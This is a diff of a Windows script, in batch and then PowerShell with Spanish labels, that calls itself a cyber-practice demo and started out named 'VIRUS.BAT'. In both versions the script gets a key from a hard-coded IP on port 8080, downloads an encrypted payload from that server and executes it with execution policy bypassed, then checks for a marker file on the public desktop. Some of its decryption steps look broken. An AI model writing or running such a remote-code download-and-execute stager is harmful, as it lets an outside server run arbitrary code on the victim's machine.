@@ -1,85 +1,70 @@
-@echo off
-REM 🔥 VIRUS.BAT - FUNCIONA CON TU API EXACTA
-title CiberDemo DEBUG
-color 0A
+@powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
+Write-Host '============================================' -ForegroundColor Green
+Write-Host '  CYBER PRÁCTICA DEBUG - NATIVO WINDOWS' -ForegroundColor Green
+Write-Host '============================================' -ForegroundColor Green
+Write-Host ('PC: ' + $env:COMPUTERNAME + ' | ' + $env:USERNAME + ' | ' + (Get-Date)) -ForegroundColor Cyan
 
-echo =====================================================
-echo 🔥 CYBER PRÁCTICA - DEBUG COMPLETO
-echo =====================================================
-echo PC: %COMPUTERNAME% ^| %TIME%
-echo.
+# 1. TIMESTAMP UNIX EXACTO
+$ts = [math]::Round((Get-Date).ToUniversalTime().Subtract((New-Object DateTime 1970,1,1)).TotalSeconds)
+Write-Host ('[1/6] TS: ' + $ts) -ForegroundColor Yellow
 
-REM 1. LOG
-set LOG=%TEMP%\Cyber_%RANDOM%.log
-echo [%TIME%] INICIO >!%LOG!
+# 2. SALT FIJO
+$salt = 'CyberDefense2024_FixedSalt_32charsExactly!!'
+Write-Host ('[2/6] Salt: ' + $salt.Substring(0,12) + '...') -ForegroundColor Yellow
 
-REM 2. TIMESTAMP UNIX CORRECTO
-powershell -Command "$ts=[math]::Round((Get-Date).ToUniversalTime().Subtract((New-Object DateTime 1970,1,1)).TotalSeconds); Write-Output $ts" > %TEMP%\ts.txt
-set /p TS=<%TEMP%\ts.txt
-echo [1/6] TS Unix: %TS%
+# 3. AUTH KEY
+try {
+    $authUrl = 'http://82.29.153.101:8080/auth/key?ts=' + $ts
+    Write-Host ('[3/6] GET: ' + $authUrl) -ForegroundColor Cyan
+    $authResp = Invoke-WebRequest -Uri $authUrl -UseBasicParsing -TimeoutSec 10
+    Write-Host ('✓ Auth OK (' + $authResp.Content.Length + ' bytes)') -ForegroundColor Green
+    
+    # 4. CALCULAR CLAVE TEMPORAL
+    $tempRaw = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(($salt + $ts)))
+    $tempKey = [Convert]::ToBase64String($tempRaw[0..31])
+    
+    # 5. FERNET DESENCRIPTAR (NATIVO)
+    $authBytes = [Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($authResp.Content)))
+    $tempCipher = New-Object -TypeName 'System.Security.Cryptography.AesManaged'
+    $tempCipher.Key = $tempRaw[0..31]
+    $tempCipher.Mode = 'CBC'
+    $payloadKeyBytes = $tempCipher.CreateDecryptor().TransformFinalBlock($authBytes, 0, $authBytes.Length)
+    $payloadKey = [Text.Encoding]::UTF8.GetString($payloadKeyBytes)[0..43] -join ''
+    
+    Write-Host ('[4/6] Key: ' + $payloadKey.Substring(0,12) + '...') -ForegroundColor Green
+    
+    # 6. DOWNLOAD PAYLOAD
+    $headers = @{ 'X-Decrypt-Key' = $payloadKey }
+    Write-Host '[5/6] 📥 Payload...' -ForegroundColor Cyan
+    $payloadResp = Invoke-WebRequest -Uri 'http://82.29.153.101:8080/payload/encrypted' -Headers $headers -UseBasicParsing -TimeoutSec 15
+    
+    Write-Host ('✓ Payload OK (' + $payloadResp.Content.Length + ' bytes)') -ForegroundColor Green
+    
+    # 7. EJECUTAR PAYLOAD
+    Write-Host '[6/6] ▶️ Ejecutando...' -ForegroundColor Magenta
+    $execPayload = [scriptblock]::Create($payloadResp.Content)
+    & $execPayload
+    
+    # 8. VERIFICAR
+    Start-Sleep 3
+    $marker = "$env:PUBLIC\Desktop\SystemDiagnostic.log"
+    if (Test-Path $marker) {
+        Write-Host "`n✓ ✓ ✓ ÉXITO CONFIRMADO ✓ ✓ ✓" -ForegroundColor Green
+        Get-Content $marker
+    } else {
+        Write-Host "`n⚠️ Sin marker (normal en algunos casos)" -ForegroundColor Yellow
+    }
+    
+} catch {
+    Write-Host "`n❌ ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host 'Posibles causas:' -ForegroundColor Red
+    Write-Host '1. VPS offline (82.29.153.101:8080)' -ForegroundColor Red
+    Write-Host '2. Timestamp expiró (10min)' -ForegroundColor Red
+    Write-Host '3. artefacto.ps1 no existe en servidor' -ForegroundColor Red
+}
 
-REM 3. AUTH KEY
-echo [2/6] 🔑 Auth...
-curl -s "http://82.29.153.101:8080/auth/key?ts=%TS%" > %TEMP%\auth.enc
-if errorlevel 1 goto :error_auth
-for %%a in (%TEMP%\auth.enc) do set ASIZE=%%~za
-echo ✓ Auth OK (%ASIZE% bytes)
-
-REM 4. PAYLOAD KEY
-powershell -Command "
-$salt='CyberDefense2024_FixedSalt_32charsExactly!!%TS%';
-$hash=[System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($salt));
-$tempKeyRaw=$hash[0..31];
-$tempKey=[Convert]::ToBase64String($tempKeyRaw);
-Add-Type -AssemblyName System.Security;
-$key=[Convert]::FromBase64String((Get-Content '%TEMP%\auth.enc' -Encoding Byte -Raw));
-$cipher=New-Object -ComObject 'Fernet.Fernet' -ArgumentList @($tempKey) -ErrorAction Stop;
-$payloadKey=[System.Security.Cryptography.SHA256]::Create().ComputeHash($key+$tempKeyRaw) | ForEach-Object { $_.ToString('x2') } | Join-String -Separator '' | Select-Object -First 44;
-Write-Output $payloadKey
-" > %TEMP%\payload_key.txt
-set /p PAYLOAD_KEY=<%TEMP%\payload_key.txt
-echo [3/6] Key: %PAYLOAD_KEY:~0,12%...
-
-REM 5. DOWNLOAD
-echo [4/6] 📥 Payload...
-curl -s -H "X-Decrypt-Key: %PAYLOAD_KEY%" "http://82.29.153.101:8080/payload/encrypted" > %TEMP%\payload.enc
-for %%b in (%TEMP%\payload.enc) do set PSIZE=%%~zb
-if %PSIZE% lss 100 (
-    echo ❌ Payload vacío!
-    goto :error_payload
-)
-echo ✓ Payload (%PSIZE% bytes)
-
-REM 6. EJECUTAR
-echo [5/6] ▶️ Ejecutando...
-powershell -WindowStyle Normal -ExecutionPolicy Bypass -EncodedCommand (Get-Content %TEMP%\payload.enc -Raw | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_)) })
-echo.
-
-REM 7. CHECK
-echo [6/6] Verificando...
-if exist "%PUBLIC%\Desktop\SystemDiagnostic.log" (
-    echo ✓ ✓ ÉXITO ✓ ✓
-    type "%PUBLIC%\Desktop\SystemDiagnostic.log"
-) else (
-    echo ⚠️ Sin marker
-)
-
-REM CLEANUP
-echo 🧹 Limpiando...
-del %TEMP%\ts.txt %TEMP%\auth.enc %TEMP%\payload_key.txt %TEMP%\payload.enc >nul 2>&1
-echo ✅ Limpio
-echo Log: %LOG%
-start %TEMP%
-pause
-goto :eof
-
-:error_auth
-echo ❌ Auth 401 - TS expiró
-echo FIX: Ejecuta de nuevo (10min ventana)
-pause
-exit /b 1
-
-:error_payload
-echo ❌ Payload inválido
-pause
-exit /b 1
+Write-Host "`n================================================" -ForegroundColor Green
+Write-Host '🏁 PRÁCTICA COMPLETADA - Revise Desktop/TEMP' -ForegroundColor Green
+Write-Host '================================================" -ForegroundColor Green
+Read-Host 'Presione ENTER para salir'
+}"
